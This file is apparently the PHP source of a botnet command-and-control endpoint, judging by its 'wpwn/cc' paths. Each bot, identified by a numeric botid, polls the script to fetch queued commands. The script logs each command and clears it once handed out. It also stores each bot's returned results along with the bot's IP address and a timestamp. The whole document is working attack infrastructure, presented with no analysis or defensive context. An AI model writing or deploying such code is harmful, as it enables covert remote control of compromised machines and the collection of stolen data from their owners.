<?php
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$datum = Date("j/m/Y H:i:s", Time());

if (!isset($_POST['botid'])) return 0;
$botid=$_POST['botid'];
if (!isset($_POST['mode'])) return 0;
$mode=$_POST['mode'];

if (!(preg_match('/^[0-9]*$/D', $botid))) return 0;
if (empty($botid)) return 0; // botid=

if ($mode == "out") {
   if (!isset($_POST['result'])) return 0;
   $result=$_POST['result'];
   $file_out = "../../wpwn/cc/$botid/out";
   if ( !($fpout = fopen("$file_out", "a"))) return 0;
   fwrite($fpout, "\n===== RES: $ip; $datum; ===== \n");
   fwrite($fpout, "$result");
   fwrite($fpout, "\n----- RES: $ip; $datum; ----- \n");
   fclose($fpout);

}

if ($mode == "in")  {
 // get command
 $file_in = "../../wpwn/cc/$botid/in";
 if ( !is_file($file_in)) {
  $fpin = fopen("$file_in", "w");
  fclose($fpin);
 } else {
  if ( !($fpin = fopen("$file_in", "c+"))) return 0;
  
  $command=fread($fpin,max(1,filesize("$file_in"))); // wtf
  
  if ($command) {
    // log
    $file_log = "../../wpwn/cc/$botid/log";
    if ( !($fplog = fopen("$file_log", "a"))) return 0;
    fwrite($fplog, "\n===== CMD: $ip; $datum; ===== \n");
    fwrite($fplog, "$command");
    fwrite($fplog, "\n----- CMD: $ip; $datum; ----- \n");
    fclose($fplog);
  
    // cmd executed => delete
    ftruncate($fpin,0);
    fclose($fpin);
  
    // command for bot
    print "$command";
  }
 }
}

?>
